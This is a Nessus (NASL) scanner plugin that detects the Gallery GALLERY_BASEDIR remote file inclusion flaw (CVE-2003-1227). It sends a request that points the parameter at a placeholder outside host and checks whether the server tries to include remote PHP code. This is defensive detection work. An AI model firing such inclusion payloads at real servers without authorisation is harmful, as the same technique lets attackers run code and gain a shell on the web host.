#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if(description)
{
 script_id(11876);
 script_version ("$Revision: 1.17 $");

 script_cve_id("CVE-2003-1227");
 script_bugtraq_id(8814);
 script_xref(name:"OSVDB", value:"2662");

 script_name(english:"Gallery index.php GALLERY_BASEDIR Variable Remote File Inclusion");
 script_summary(english:"Checks for the presence of 'setup/index.php'");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by
a remote file inclusion vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote host include php files hosted
on a third party server using Gallery.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server." );
 script_set_attribute(attribute:"see_also", value:"http://gallery.menalto.com/node/93" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Gallery 1.4pl2 or 1.4.1 or newer." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:80, embedded: 0);
if(! can_host_php(port:port) ) exit(0);

function check(url)
{
  local_var r;
  url = string(url,"/setup/index.php?GALLERY_BASEDIR=http://xxxxxxxx/");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  if(egrep(pattern:"http://xxxxxxxx//?util.php", string:r))
  {
    security_hole(port);
    exit(0);
  }
}

foreach dir (cgi_dirs())
 check(url:dir);
